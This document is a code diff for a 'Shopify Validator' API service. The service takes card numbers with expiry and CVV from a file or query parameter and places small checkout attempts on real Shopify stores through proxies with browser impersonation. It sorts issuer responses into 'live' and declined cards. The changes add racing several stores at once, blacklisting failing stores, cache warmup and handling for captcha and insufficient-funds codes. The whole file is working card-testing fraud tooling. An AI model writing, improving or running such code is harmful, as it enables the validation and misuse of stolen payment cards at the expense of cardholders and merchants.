@@ -4,7 +4,9 @@ High-performance, fully async, production-ready.
 
 Endpoints:
   GET /shopify?site={site}&cc={card}&proxy={proxy}&key={key}
+  GET /shopify-race?sites=s1,s2,s3&cc={card}&proxy={proxy}&key={key}  (races N sites)
   GET /check?site={site}&card={card}&proxy={proxy}&key={key}
+  GET /site-stats
   GET /health
   GET /stats
 
@@ -15,13 +17,16 @@ Environment variables (all optional):
   PORT              Server port (default 8080)
   WORKERS           uvicorn worker count (default 1)
   CARDS_FILE        Path to cards.txt (default ./cards.txt)
-  MAX_PRICE         Max product price to target (default 500.0)
+  SITES_FILE        Path to sites.txt used for startup warmup (default ./sites.txt)
+  MAX_PRICE         Max product price to target (default 5.0)
+  MIN_AMOUNT        Minimum product price to consider (default 0.50)
   SITE_CONCURRENCY  Max simultaneous requests per store (default 15)
-  POOL_SIZE         aiohttp global connection pool (default 500)
-  POOL_PER_HOST     aiohttp per-host connection limit (default 25)
-  CONNECT_TIMEOUT   TCP connect timeout seconds (default 8)
-  REQUEST_TIMEOUT   Full request timeout seconds (default 35)
+  RACE_COUNT        Default sites to race when /shopify-race is called (default 3)
+  BLACKLIST_THRESHOLD  Fraction of site errors to blacklist (default 0.85)
+  BLACKLIST_SAMPLES    Minimum samples before blacklisting (default 8)
+  BLACKLIST_SECONDS    Blacklist cooldown (default 300)
   CACHE_TTL         Product cache TTL seconds (default 300)
+  VARIANT_TTL       Variant cache TTL seconds (default 1800)
   LOG_LEVEL         Logging level: debug|info|warning (default warning)
   LOG_FILE          Request log file (default requests.txt)
   API_KEYS          Comma-separated list of accepted API keys
@@ -29,13 +34,12 @@ Environment variables (all optional):
 
 import asyncio
 import copy
-
 import logging
 import os
 import random
 import re
 import time
-from collections import defaultdict
+from collections import defaultdict, deque
 from contextlib import asynccontextmanager
 from typing import Any, Optional
 from urllib.parse import urlparse
@@ -45,64 +49,63 @@ import orjson
 import uvicorn
 from fastapi import FastAPI, Query, Request
 from fastapi.middleware.cors import CORSMiddleware
-from fastapi.responses import JSONResponse, HTMLResponse
+from fastapi.responses import JSONResponse
 from dotenv import load_dotenv
 load_dotenv()
 
 # ---------------------------------------------------------------------------
-# Configuration from environment
+# Configuration
 # ---------------------------------------------------------------------------
-PORT             = int(os.environ.get("PORT", 8080))
-WORKERS          = int(os.environ.get("WORKERS", 1))
-CARDS_FILE       = os.environ.get("CARDS_FILE", "cards.txt")
-MAX_PRICE        = float(os.environ.get("MAX_PRICE", 5.0))
-SITE_CONCURRENCY = int(os.environ.get("SITE_CONCURRENCY", 15))
-POOL_SIZE        = int(os.environ.get("POOL_SIZE", 500))
-POOL_PER_HOST    = int(os.environ.get("POOL_PER_HOST", 25))
-CONNECT_TIMEOUT  = float(os.environ.get("CONNECT_TIMEOUT", 8))
-REQUEST_TIMEOUT  = float(os.environ.get("REQUEST_TIMEOUT", 35))
-CACHE_TTL        = float(os.environ.get("CACHE_TTL", 300))
-LOG_LEVEL        = os.environ.get("LOG_LEVEL", "warning").upper()
-LOG_FILE         = os.environ.get("LOG_FILE", "requests.txt")
+PORT                  = int(os.environ.get("PORT", 8080))
+WORKERS               = int(os.environ.get("WORKERS", 1))
+CARDS_FILE            = os.environ.get("CARDS_FILE", "cards.txt")
+SITES_FILE            = os.environ.get("SITES_FILE", "sites.txt")
+MAX_PRICE             = float(os.environ.get("MAX_PRICE", 5.0))
+MIN_AMOUNT            = float(os.environ.get("MIN_AMOUNT", 0.50))
+SITE_CONCURRENCY      = int(os.environ.get("SITE_CONCURRENCY", 15))
+RACE_COUNT            = int(os.environ.get("RACE_COUNT", 3))
+BLACKLIST_THRESHOLD   = float(os.environ.get("BLACKLIST_THRESHOLD", 0.85))
+BLACKLIST_SAMPLES     = int(os.environ.get("BLACKLIST_SAMPLES", 8))
+BLACKLIST_SECONDS     = int(os.environ.get("BLACKLIST_SECONDS", 300))
+CACHE_TTL             = float(os.environ.get("CACHE_TTL", 300))
+VARIANT_TTL           = float(os.environ.get("VARIANT_TTL", 1800))
+REQUEST_TIMEOUT       = float(os.environ.get("REQUEST_TIMEOUT", 35))
+LOG_LEVEL             = os.environ.get("LOG_LEVEL", "warning").upper()
+LOG_FILE              = os.environ.get("LOG_FILE", "requests.txt")
 
-# ─── API authentication ──────────────────────────────────────────────────
-# Comma-separated list of accepted API keys. Set via env or override here.
-# If empty, authentication is disabled (not recommended for public deploys).
 VALID_API_KEYS = set(
     k.strip()
-    for k in os.environ.get(
-        "API_KEYS",
-        "oozaruhshop"
-    ).split(",")
+    for k in os.environ.get("API_KEYS", "oozaruhshop").split(",")
     if k.strip()
 )
 
-# ─── Known card responses (vs. site errors) ──────────────────────────────
-# Response codes in this set mean "we got a real gateway answer".
-# Anything else is treated as a site error and triggers a retry in msh.py.
+# ─── Response codes we treat as a real card result (not site error) ─────
 KNOWN_CARD_RESPONSES = frozenset({
-    "ORDER_PLACED",
-    "INSUFFICIENT_FUNDS",
-    "INVALID_CVC",
-    "3DS_REQUIRED",
-    "OTP_REQUIRED",
-    "EXPIRED_CARD",
-    "INVALID_CARD",
-    "CARD_DECLINED",
-    "FRAUD_SUSPECTED",
-    "DECISION_RULE_BLOCK",
-    "DO_NOT_HONOR",
-    "PROCESSING_ERROR",
-    "GENERIC_DECLINE",
-    "AMOUNT_TOO_SMALL",
-    "INCORRECT_NUMBER",
-    "PICK_UP_CARD",
-    "TEST_MODE_LIVE_CARD",
-    "INVALID_PURCHASE_TYPE",
-    "INVALID_PAYMENT_METHOD",
-    "STOLEN_CARD",
-    "LOST_CARD",
-    "RESTRICTED_CARD",
+    "ORDER_PLACED", "INSUFFICIENT_FUNDS", "INVALID_CVC", "3DS_REQUIRED",
+    "OTP_REQUIRED", "EXPIRED_CARD", "INVALID_CARD", "CARD_DECLINED",
+    "FRAUD_SUSPECTED", "DECISION_RULE_BLOCK", "DO_NOT_HONOR",
+    "PROCESSING_ERROR", "GENERIC_DECLINE", "AMOUNT_TOO_SMALL",
+    "INCORRECT_NUMBER", "PICK_UP_CARD", "TEST_MODE_LIVE_CARD",
+    "INVALID_PURCHASE_TYPE", "INVALID_PAYMENT_METHOD", "STOLEN_CARD",
+    "LOST_CARD", "RESTRICTED_CARD",
+})
+
+# ─── Response codes that represent a "site error" (bot should retry) ────
+SITE_ERROR_CODES = frozenset({
+    "GRAPHQL_ERROR", "THROTTLED", "TIMEOUT", "CART_FAILED",
+    "CHECKOUT_FAILED", "NO_SESSION_TOKEN", "NO_ATTEMPT_TOKEN",
+    "NO_SELLER_PROPOSAL", "NO_SHOPIFY_PAYMENTS_GATEWAY", "SITE_ERROR",
+    "PROXY_ERROR", "CAPTCHA_REQUIRED", "SITE_REQUIRES_LOGIN",
+    "NO_PRODUCT", "SUBMIT_FAILED", "NEGOTIATE_FAILED",
+    "CHECKPOINTDENIED", "SESSION_EXPIRED", "ORDER_CREATION_FAILED",
+    "NO_PAYMENT_REQUIRED", "TOKENIZATION_FAILED", "NO_PRODUCT_FOUND",
+})
+
+# Short-lived response codes that indicate a live gateway — keep for LIVE.
+LIVE_RESPONSES = frozenset({
+    "ORDER_PLACED", "3DS_REQUIRED", "INSUFFICIENT_FUNDS",
+    "CARD_DECLINED", "INVALID_CVC", "EXPIRED_CARD",
+    "INVALID_CARD", "THROTTLED",
 })
 
 logging.basicConfig(
@@ -111,22 +114,9 @@ logging.basicConfig(
 )
 log = logging.getLogger("shopify")
 
-app = FastAPI(
-    title="Shopify Validator API",
-    version="3.2",
-    description="High-performance Shopify Checkout & Gateway Validator"
-)
-
-app.add_middleware(
-    CORSMiddleware,
-    allow_origins=["*"],
-    allow_credentials=True,
-    allow_methods=["*"],
-    allow_headers=["*"],
-)
 
 # ---------------------------------------------------------------------------
-# Request / Response file logger  (incoming + all outgoing HTTP calls)
+# Request / Response file logger
 # ---------------------------------------------------------------------------
 import aiofiles
 import datetime
@@ -136,7 +126,6 @@ _SEP      = "=" * 70
 
 
 async def _write_log(entry: str) -> None:
-    """Non-blocking append to LOG_FILE."""
     async with _log_lock:
         try:
             async with aiofiles.open(LOG_FILE, mode="a", encoding="utf-8") as f:
@@ -153,19 +142,16 @@ def _truncate(text: str, limit: int = 3000) -> str:
 
 async def _log_incoming(request: "Request", response_body: bytes,
                         status_code: int, elapsed_ms: float) -> None:
-    """Log an incoming API request + its response to requests.txt."""
     now    = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
     method = request.method
     url    = str(request.url)
     path   = request.url.path
     params = dict(request.query_params)
     client = request.client.host if request.client else "unknown"
-
     try:
         body_str = response_body.decode("utf-8", errors="replace")
     except Exception:
         body_str = "<binary>"
-
     entry = (
         f"\n{_SEP}\n"
         f"[{now}]  INCOMING  {method} {url}\n"
@@ -183,10 +169,7 @@ async def _log_incoming(request: "Request", response_body: bytes,
 async def _log_outgoing(method: str, url: str, req_body,
                         status_code: int, resp_text: str,
                         elapsed_ms: float, label: str = "") -> None:
-    """Log an outgoing HTTP call made internally by the API."""
     now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-
-    # Sanitize request body
     try:
         if isinstance(req_body, bytes):
             rb = req_body.decode("utf-8", errors="replace")
@@ -196,7 +179,6 @@ async def _log_outgoing(method: str, url: str, req_body,
             rb = str(req_body)
     except Exception:
         rb = "<unreadable>"
-
     entry = (
         f"\n{_SEP}\n"
         f"[{now}]  OUTGOING  {method} {url}"
@@ -211,21 +193,15 @@ async def _log_outgoing(method: str, url: str, req_body,
 
 
 # ---------------------------------------------------------------------------
-# LoggedSession — wraps AsyncSession and logs every request
+# LoggedSession
 # ---------------------------------------------------------------------------
 class LoggedSession:
-    """
-    Thin wrapper around curl_cffi AsyncSession that logs every
-    HTTP request and its response to requests.txt.
-    """
-
     def __init__(self, session: "AsyncSession"):
         self._s = session
 
     async def _call(self, method: str, url: str, label: str = "",
                     data=None, json=None, **kwargs):
         t0 = time.time()
-        # Build the body we'll log (before sending, in case of error)
         req_body = data if data is not None else (
             orjson.dumps(json) if json is not None else None
         )
@@ -236,26 +212,21 @@ class LoggedSession:
                 resp = await getattr(self._s, method.lower())(url, data=data, **kwargs)
             else:
                 resp = await getattr(self._s, method.lower())(url, **kwargs)
-
             elapsed = (time.time() - t0) * 1000
             try:
                 resp_text = resp.text
             except Exception:
                 resp_text = "<unreadable>"
-
             asyncio.create_task(
                 _log_outgoing(method.upper(), url, req_body,
-                              resp.status_code, resp_text, elapsed, label)
-            )
+                              resp.status_code, resp_text, elapsed, label))
             return resp
-
         except Exception as exc:
             elapsed = (time.time() - t0) * 1000
             asyncio.create_task(
                 _log_outgoing(method.upper(), url, req_body,
                               0, f"EXCEPTION: {type(exc).__name__}: {exc}",
-                              elapsed, label)
-            )
+                              elapsed, label))
             raise
 
     async def get(self, url: str, label: str = "", **kwargs):
@@ -264,15 +235,13 @@ class LoggedSession:
     async def post(self, url: str, label: str = "", data=None, json=None, **kwargs):
         return await self._call("POST", url, label=label, data=data, json=json, **kwargs)
 
-    # Proxy anything else directly to the underlying session
     def __getattr__(self, name):
         return getattr(self._s, name)
 
 
 # ---------------------------------------------------------------------------
-# GraphQL Queries
+# GraphQL queries (unchanged from original)
 # ---------------------------------------------------------------------------
-# Variable declarations shared by both proposal queries
 _PROPOSAL_VARS = (
     "$sessionInput:SessionTokenInput!,"
     "$delivery:DeliveryTermsInput,$discounts:DiscountTermsInput,"
@@ -295,7 +264,6 @@ _PROPOSAL_VARS = (
     "$cartMetafields:[CartMetafieldOperationInput!]"
 )
 
-# PurchaseProposal arguments shared by both proposal queries
 _PROPOSAL_ARGS = (
     "delivery:$delivery,discounts:$discounts,payment:$payment,"
     "merchandise:$merchandise,buyerIdentity:$buyerIdentity,taxes:$taxes,"
@@ -313,7 +281,6 @@ _PROPOSAL_ARGS = (
     "cartMetafields:$cartMetafields"
 )
 
-# SellerProposal fragment (shared by shipping & delivery queries)
 _SELLER_PROPOSAL_FIELDS = (
     "sellerProposal{"
     "runningTotal{...on MoneyValueConstraint{value{amount currencyCode}}}"
@@ -352,7 +319,6 @@ QUERY_PROPOSAL_SHIPPING = (
     "errors{code localizedMessage nonLocalizedMessage __typename}}}}"
 )
 
-# Receipt fragment shared by delivery proposal and submit mutation
 _RECEIPT_FRAGMENT = (
     "fragment ReceiptDetails on Receipt{"
     "...on ProcessedReceipt{id token __typename}"
@@ -469,19 +435,38 @@ USER_AGENTS = [
 ]
 
 # ---------------------------------------------------------------------------
-# Global process-level state
+# Global state
 # ---------------------------------------------------------------------------
 _shared_session: Optional[LoggedSession] = None
 _site_semaphores: dict[str, asyncio.Semaphore] = defaultdict(
     lambda: asyncio.Semaphore(SITE_CONCURRENCY)
 )
 
-# Product cache: hostname -> {"product": dict|None, "candidates": list, "err": str, "ts": float}
+# Fix 3: variant cache (hostname -> {"variant": {...}, "ts": float})
+_variant_cache: dict[str, dict] = {}
+
+# Fix 2: circuit-breaker state per site
+_site_stats: dict[str, dict] = defaultdict(lambda: {
+    "outcomes":            deque(maxlen=50),
+    "blacklisted_until":   0.0,
+    "consecutive_errors":  0,
+    "success_count":       0,
+    "error_count":         0,
+})
+
+# Fix 12: sticky UA per site (hostname -> UA string)
+_site_ua: dict[str, str] = {}
+
+# Fix 13: per-host lock so concurrent card checks for the same store don't
+# all fetch products.json at once (request coalescing).
+_host_locks: dict[str, asyncio.Lock] = defaultdict(asyncio.Lock)
+
 _product_cache: dict[str, dict] = {}
 
-# Cards loaded from file
 _cards_cache: list[dict] = []
 _cards_loaded_at: float  = 0.0
+
+_stats: dict[str, int] = defaultdict(int)
 
 
 # ---------------------------------------------------------------------------
@@ -490,10 +475,16 @@ _cards_loaded_at: float  = 0.0
 @asynccontextmanager
 async def lifespan(app: FastAPI):
     global _shared_session
-    _shared_session = LoggedSession(AsyncSession(impersonate="chrome", timeout=REQUEST_TIMEOUT))
+    _shared_session = LoggedSession(
+        AsyncSession(impersonate="chrome", timeout=REQUEST_TIMEOUT)
+    )
     _reload_cards()
-    log.warning("Shopify Validator API started pool=%d/host concurrency=%d/site keys=%d",
-                POOL_SIZE, SITE_CONCURRENCY, len(VALID_API_KEYS))
+    log.warning(
+        "Shopify Validator API started concurrency=%d/site keys=%d race=%d",
+        SITE_CONCURRENCY, len(VALID_API_KEYS), RACE_COUNT,
+    )
+    # Fix 5: warmup in the background
+    asyncio.create_task(_warmup_sites())
     yield
     if _shared_session:
         res = _shared_session.close()
@@ -501,7 +492,7 @@ async def lifespan(app: FastAPI):
             await res
 
 
-app = FastAPI(title="Shopify Validator", version="3.2.0", lifespan=lifespan)
+app = FastAPI(title="Shopify Validator", version="3.4.0", lifespan=lifespan)
 
 app.add_middleware(
     CORSMiddleware,
@@ -511,17 +502,41 @@ app.add_middleware(
     allow_headers=["*"],
 )
 
-# Request statistics
-_stats: dict[str, int] = defaultdict(int)
+
+async def _warmup_sites():
+    """Fix 5: pre-fetch products for every site in SITES_FILE so the
+    first card of the session hits a warm cache."""
+    await asyncio.sleep(2)  # let startup finish
+    sites: list[str] = []
+    try:
+        if os.path.exists(SITES_FILE):
+            with open(SITES_FILE, "r", encoding="utf-8", errors="ignore") as f:
+                sites = [ln.strip() for ln in f if ln.strip()]
+    except Exception as ex:
+        log.debug("[warmup] could not read SITES_FILE: %s", ex)
+        return
+    if not sites:
+        return
+    log.warning("[warmup] Pre-fetching products for %d sites", len(sites))
+    sem = asyncio.Semaphore(10)
+
+    async def _one(site):
+        async with sem:
+            try:
+                await _fetch_products(site, max_price=MAX_PRICE)
+            except Exception:
+                pass
+
+    await asyncio.gather(*[_one(s) for s in sites], return_exceptions=True)
+    log.warning("[warmup] Done. Product cache size: %d", len(_product_cache))
 
 
 # ---------------------------------------------------------------------------
 # Utility helpers
 # ---------------------------------------------------------------------------
-
 def _reload_cards() -> None:
     global _cards_cache, _cards_loaded_at
-    _cards_cache  = _load_cards_from_file()
+    _cards_cache = _load_cards_from_file()
     _cards_loaded_at = time.time()
 
 
@@ -545,7 +560,6 @@ def _get_cards() -> list[dict]:
 
 
 def _parse_card(raw: str) -> Optional[dict]:
-    """Accept cc|mm|yy|cvv and cc|mm|yyyy|cvv.  Returns normalized dict or None."""
     raw = raw.strip()
     if not raw or raw.startswith("#"):
         return None
@@ -567,48 +581,25 @@ def _parse_card(raw: str) -> Optional[dict]:
 
 
 def _parse_proxy(raw: Optional[str]) -> Optional[str]:
-    """
-    Accepts all of these and returns a single URL form the aiohttp/curl_cffi
-    session can consume:
-
-      http://user:pass@host:port       (already URL form)
-      https://host:port
-      socks5://host:port
-      user:pass@host:port              (URL form, no scheme)
-      host:port
-      user pass host port              (space-separated 4-field form)
-      host:port:user:pass              (colon-separated 4-field form)
-    """
     if not raw:
         return None
     s = raw.strip()
     if not s:
         return None
-
-    # Already has a scheme (http://, https://, socks5://, etc.)
     if "://" in s:
         return s
-
-    # URL form without a scheme:  user:pass@host:port
     if "@" in s and ":" in s:
         return f"http://{s}"
-
-    # Space-separated:  user pass host port   (4 fields)
     parts_ws = s.split()
     if len(parts_ws) == 4:
         user, pwd, host, port = parts_ws
         return f"http://{user}:{pwd}@{host}:{port}"
-
-    # Colon-separated
     parts = s.split(":")
     if len(parts) == 2:
-        # ip:port
         return f"http://{parts[0]}:{parts[1]}"
     if len(parts) == 4:
-        # ip:port:user:pass
         ip, port, user, password = parts
         return f"http://{user}:{password}@{ip}:{port}"
-
     return None
 
 
@@ -632,7 +623,6 @@ def _random_identity() -> tuple[str, str, str]:
 
 
 def _extract(text: str, start: str, end: str) -> Optional[str]:
-    """Fast substring extraction between two delimiters."""
     idx = text.find(start)
     if idx == -1:
         return None
@@ -645,12 +635,9 @@ def _extract(text: str, start: str, end: str) -> Optional[str]:
 
 
 def _extract_sst(text: str, headers: dict) -> Optional[str]:
-    """Try every known pattern to pull the Shopify checkout session token."""
-    # From response header (fastest)
     for key in ("X-Checkout-One-Session-Token", "x-checkout-one-session-token"):
         if key in headers:
             return headers[key]
-    # From HTML / JSON embedded in page
     patterns = [
         ('name="serialized-sessionToken" content="&quot;', "&quot;"),
         ('name="serialized-sessionToken" content="', '"'),
@@ -668,7 +655,13 @@ def _extract_sst(text: str, headers: dict) -> Optional[str]:
 
 
 def _normalize_response(raw: Optional[str]) -> str:
-    """Map raw Shopify / aiohttp error text to a standard code."""
+    """
+    Map raw Shopify / API error text to a standard code.
+
+    FIX: DO_NOT_HONOR is no longer mapped to INSUFFICIENT_FUNDS — it is a
+    generic issuer decline and must not trigger a false insufficient-funds
+    DM in msh.py.
+    """
     if not raw:
         return "CARD_DECLINED"
     msg = str(raw).upper()
@@ -684,8 +677,9 @@ def _normalize_response(raw: Optional[str]) -> str:
                                "SECURITY_CODE", "CVV_FAILURE", "INCORRECT_CVC",
                                "CVC_CHECK_FAILED", "CVV_CHECK_FAILED")):
         return "INVALID_CVC"
-    if any(k in msg for k in ("INSUFFICIENT_FUNDS", "INSUFFICIENT", "DO_NOT_HONOR",
-                               "NOT_SUFFICIENT_FUNDS", "EXCEEDS_BALANCE")):
+    if any(k in msg for k in ("INSUFFICIENT_FUNDS", "INSUFFICIENT",
+                               "NOT_SUFFICIENT_FUNDS", "EXCEEDS_BALANCE",
+                               "NOT_ENOUGH_BALANCE", "LOW_BALANCE")):
         return "INSUFFICIENT_FUNDS"
     if any(k in msg for k in ("EXPIRED", "EXPIRY", "INVALID_EXPIRY", "EXPIRATION")):
         return "EXPIRED_CARD"
@@ -697,7 +691,8 @@ def _normalize_response(raw: Optional[str]) -> str:
         return "CARD_DECLINED"
     if any(k in msg for k in ("CALL_ISSUER", "REFER_TO_ISSUER", "CONTACT_ISSUER")):
         return "CARD_DECLINED"
-    if any(k in msg for k in ("GENERIC_DECLINE", "TRANSACTION_NOT_ALLOWED",
+    if any(k in msg for k in ("DO_NOT_HONOR", "DO NOT HONOR",
+                               "GENERIC_DECLINE", "TRANSACTION_NOT_ALLOWED",
                                "NOT_PERMITTED", "SERVICE_NOT_ALLOWED",
                                "TRY_AGAIN_LATER", "LIMIT_EXCEEDED")):
         return "CARD_DECLINED"
@@ -707,11 +702,6 @@ def _normalize_response(raw: Optional[str]) -> str:
 
 
 def _parse_gql_errors(errors: list) -> str:
-    """
-    Try to extract a meaningful response code from a GraphQL errors list.
-    Conservative: only returns a specific code for very clear matches.
-    Returns 'GRAPHQL_ERROR' for anything ambiguous so callers can retry.
-    """
     for err in errors:
         for field in ("code", "nonLocalizedMessage", "localizedMessage",
                       "message", "localizedMessageHtml", "messageUntranslated"):
@@ -724,13 +714,14 @@ def _parse_gql_errors(errors: list) -> str:
             upper = raw.upper()
             if any(k in upper for k in ("CAPTCHA", "RECAPTCHA", "HCAPTCHA", "BOT_DETECTION", "CHALLENGE_REQUIRED")):
                 return "CAPTCHA_REQUIRED"
-            if any(k in upper for k in ("INSUFFICIENT_FUNDS", "INSUFFICIENT", "EXCEEDS_BALANCE")):
+            if any(k in upper for k in ("INSUFFICIENT_FUNDS", "INSUFFICIENT", "EXCEEDS_BALANCE",
+                                         "NOT_ENOUGH_BALANCE", "LOW_BALANCE")):
                 return "INSUFFICIENT_FUNDS"
             if any(k in upper for k in ("INVALID_CVC", "INVALID_SECURITY_CODE", "CVC_FAILURE", "CVV_FAILURE", "INCORRECT_CVC")):
                 return "INVALID_CVC"
             if any(k in upper for k in ("PAYMENT_DECLINED", "CARD_DECLINED",
                                          "CHARGE_DECLINED", "CARD_WAS_DECLINED",
-                                         "FRAUD")):
+                                         "FRAUD", "DO_NOT_HONOR", "DO NOT HONOR")):
                 return "CARD_DECLINED"
             if any(k in upper for k in ("CHECKOUT_ALREADY_COMPLETED", "ALREADY_ACCEPTED")):
                 return "CARD_DECLINED"
@@ -749,33 +740,105 @@ def _parse_gql_errors(errors: list) -> str:
     return "GRAPHQL_ERROR"
 
 
-def _make_session(proxy_str: Optional[str]) -> tuple[LoggedSession, bool]:
+def _make_session(proxy_str: Optional[str] = None,
+                  session: Optional[LoggedSession] = None) -> tuple[LoggedSession, bool]:
+    """Create a new LoggedSession, or reuse one if supplied."""
+    if session is not None:
+        return session, False
     proxy = _parse_proxy(proxy_str) if proxy_str else None
     proxies = {"http": proxy, "https": proxy} if proxy else None
-    session = LoggedSession(AsyncSession(impersonate="chrome", timeout=REQUEST_TIMEOUT, proxies=proxies))
-    return session, True
+    return LoggedSession(AsyncSession(
+        impersonate="chrome", timeout=REQUEST_TIMEOUT, proxies=proxies)), True
 
 
 # ---------------------------------------------------------------------------
-# Product fetching with TTL cache
+# Fix 2: per-site circuit breaker
+# ---------------------------------------------------------------------------
+def _is_site_available(hostname: str) -> bool:
+    s = _site_stats.get(hostname)
+    if not s:
+        return True
+    if time.time() < s["blacklisted_until"]:
+        return False
+    return True
+
+
+def _record_site_result(hostname: str, response_code: str) -> None:
+    """
+    Update the rolling stats for a site. Called from the route handler
+    after each validate_card() returns.
+
+    A "site error" is any response code in SITE_ERROR_CODES. Everything
+    else (ORDER_PLACED, INSUFFICIENT_FUNDS, CARD_DECLINED, 3DS_REQUIRED,
+    INVALID_CVC, EXPIRED_CARD, etc.) counts as a live response.
+    """
+    s = _site_stats[hostname]
+    is_err = response_code in SITE_ERROR_CODES
+    s["outcomes"].append(1 if is_err else 0)
+    if is_err:
+        s["consecutive_errors"] += 1
+        s["error_count"] += 1
+    else:
+        s["consecutive_errors"] = 0
+        s["success_count"] += 1
+
+    if (len(s["outcomes"]) >= BLACKLIST_SAMPLES and
+        sum(s["outcomes"]) / len(s["outcomes"]) >= BLACKLIST_THRESHOLD):
+        s["blacklisted_until"] = time.time() + BLACKLIST_SECONDS
+        log.warning(
+            "[API] Site blacklisted for %ds: %s (%d/%d errors)",
+            BLACKLIST_SECONDS, hostname,
+            sum(s["outcomes"]), len(s["outcomes"]),
+        )
+
+
+# ---------------------------------------------------------------------------
+# Fix 8: pick a price with a minimum floor of MIN_AMOUNT
+# ---------------------------------------------------------------------------
+def _preferred_variant(candidates: list[dict], max_price: float) -> Optional[dict]:
+    """
+    Given a list of candidate variants, prefer:
+      1. Cheapest variant >= MIN_AMOUNT and <= max_price
+      2. If none, cheapest variant <= max_price
+      3. If none, cheapest variant overall (fallback)
+    """
+    if not candidates:
+        return None
+
+    def _pf(c):
+        try:
+            return float(c.get("price", "1e9"))
+        except (ValueError, TypeError):
+            return 1e9
+
+    within = [c for c in candidates if _pf(c) <= max_price]
+    above_min = [c for c in within if _pf(c) >= MIN_AMOUNT]
+
+    if above_min:
+        return min(above_min, key=_pf)
+    if within:
+        return min(within, key=_pf)
+    # fallback: cheapest overall
+    return min(candidates, key=_pf)
+
+
+# ---------------------------------------------------------------------------
+# Product fetching
 # ---------------------------------------------------------------------------
 async def _fetch_products(
     base_url: str,
     proxy_str: Optional[str] = None,
     max_price: float = MAX_PRICE,
+    session: Optional[LoggedSession] = None,   # Fix 4: session reuse
 ) -> tuple[Optional[dict], list[dict], Optional[str]]:
     """
     Returns (best_product, all_candidates, error_string).
 
-    Filtering behaviour:
-      1. Gather every in-stock variant on the site.
-      2. Prefer variants whose price is <= max_price.
-      3. If NO variant falls within the price range, fall back to the
-         single cheapest variant available on the site (even if it exceeds
-         max_price). This guarantees the caller always has a product to
-         work with as long as the store sells anything at all.
-
-    Results are cached per hostname for CACHE_TTL seconds.
+    Fix 3, 4, 8, 13 applied:
+      - Reuses caller's session when supplied (no second TLS handshake)
+      - Coalesces concurrent fetches for the same host
+      - Prefers cheapest variant >= MIN_AMOUNT; falls back to cheapest overall
+      - Cached per hostname for CACHE_TTL
     """
     if not base_url.startswith("http"):
         base_url = "https://" + base_url
@@ -787,163 +850,161 @@ async def _fetch_products(
     if cached and (now - cached["ts"]) < CACHE_TTL:
         return cached.get("product"), cached.get("candidates", []), cached.get("err")
 
-    session, owned = _make_session(proxy_str)
+    # Fix 13: hold a per-host lock so concurrent cards don't stampede
+    # products.json for the same store.
+    async with _host_locks[hostname]:
+        # Re-check cache under the lock
+        cached = _product_cache.get(hostname)
+        if cached and (time.time() - cached["ts"]) < CACHE_TTL:
+            return cached.get("product"), cached.get("candidates", []), cached.get("err")
 
-    try:
-        all_variants: list[dict] = []
-        urls_to_try = [
-            f"{base_url}/products.json?limit=250&sort_by=price-ascending",
-            f"{base_url}/products.json?limit=250",
-        ]
-        for url in urls_to_try:
-            try:
-                resp = await session.get(url, allow_redirects=True)
-                if resp.status_code == 200:
-                    data     = orjson.loads(resp.content)
-                    products = data.get("products", [])
-                    if products:
-                        all_variants = products
-                        break
-                elif resp.status_code in (429, 430):
-                    err = "THROTTLED"
+        own_session = session is None
+        if own_session:
+            session, _owned = _make_session(proxy_str)
+
+        try:
+            all_variants: list[dict] = []
+            urls_to_try = [
+                f"{base_url}/products.json?limit=250&sort_by=price-ascending",
+                f"{base_url}/products.json?limit=250",
+            ]
+            for url in urls_to_try:
+                try:
+                    resp = await session.get(url, allow_redirects=True)
+                    if resp.status_code == 200:
+                        data     = orjson.loads(resp.content)
+                        products = data.get("products", [])
+                        if products:
+                            all_variants = products
+                            break
+                    elif resp.status_code in (429, 430):
+                        err = "THROTTLED"
+                        _product_cache[hostname] = {"product": None, "candidates": [], "err": err, "ts": now}
+                        return None, [], err
+                except Exception:
+                    continue
+
+            candidates: list[dict] = []
+            any_variant: list[dict] = []
+            cheapest_any: Optional[dict] = None
+            cheapest_any_price = float("inf")
+
+            if not all_variants:
+                # Headless Shopify fallback via sitemap
+                try:
+                    import xml.etree.ElementTree as ET
+                    import re as _re
+                    sitemap_url = f"{base_url}/sitemap_products_1.xml"
+                    smap_resp = await session.get(sitemap_url, allow_redirects=True)
+                    if smap_resp.status_code == 200:
+                        root = ET.fromstring(smap_resp.content)
+                        urls = []
+                        for child in root:
+                            if child.tag.endswith('url'):
+                                for loc in child:
+                                    if loc.tag.endswith('loc'):
+                                        urls.append(loc.text)
+
+                        if urls:
+                            sample_urls = random.sample(urls, min(25, len(urls)))
+                            for purl in sample_urls:
+                                try:
+                                    p_resp = await session.get(purl, allow_redirects=True)
+                                    matches = _re.finditer(
+                                        r'"id":(\d+).*?"inStock":true.*?,"price":([\d.]+)',
+                                        p_resp.text,
+                                    )
+                                    for m in matches:
+                                        variant_id = m.group(1)
+                                        price = float(m.group(2))
+                                        if price <= 0:
+                                            continue
+                                        entry = {
+                                            "site":       base_url,
+                                            "price":      f"{price:.2f}",
+                                            "price_f":    price,
+                                            "variant_id": str(variant_id),
+                                            "title":      "Product",
+                                            "handle":     "",
+                                        }
+                                        any_variant.append(entry)
+                                        if price < cheapest_any_price:
+                                            cheapest_any_price = price
+                                            cheapest_any       = entry
+                                        if price <= max_price:
+                                            candidates.append(entry)
+                                except Exception:
+                                    pass
+                except Exception:
+                    pass
+
+                if not any_variant:
+                    err = "No products found"
                     _product_cache[hostname] = {"product": None, "candidates": [], "err": err, "ts": now}
                     return None, [], err
-            except Exception:
-                continue
+            else:
+                for product in all_variants:
+                    for variant in product.get("variants", []):
+                        try:
+                            if variant.get("available", True) is False:
+                                continue
+                            price = float(variant.get("price") or "0")
+                        except (ValueError, TypeError):
+                            continue
+                        if price <= 0:
+                            continue
 
-        # ── Containers ──────────────────────────────────────────────────
-        candidates: list[dict] = []              # variants within price range
-        any_variant: list[dict] = []             # every in-stock variant, any price
-        best: Optional[dict] = None
-        best_price = float("inf")
-        cheapest_any: Optional[dict] = None
-        cheapest_any_price = float("inf")
+                        entry = {
+                            "site":       base_url,
+                            "price":      f"{price:.2f}",
+                            "price_f":    price,
+                            "variant_id": str(variant["id"]),
+                            "title":      product.get("title", "Product"),
+                            "handle":     product.get("handle", ""),
+                        }
+                        any_variant.append(entry)
 
-        if not all_variants:
-            # Fallback for headless Shopify where products.json is unavailable
-            try:
-                import xml.etree.ElementTree as ET
-                import re as _re
